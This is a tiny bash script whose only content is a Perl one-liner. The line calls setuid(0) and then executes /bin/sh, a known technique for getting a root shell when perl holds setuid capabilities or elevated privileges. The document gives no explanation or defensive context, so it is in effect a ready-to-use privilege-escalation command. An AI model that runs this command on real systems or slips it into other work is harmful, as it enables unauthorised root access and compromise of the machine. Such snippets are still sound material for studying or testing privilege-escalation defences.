#!/bin/bash

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

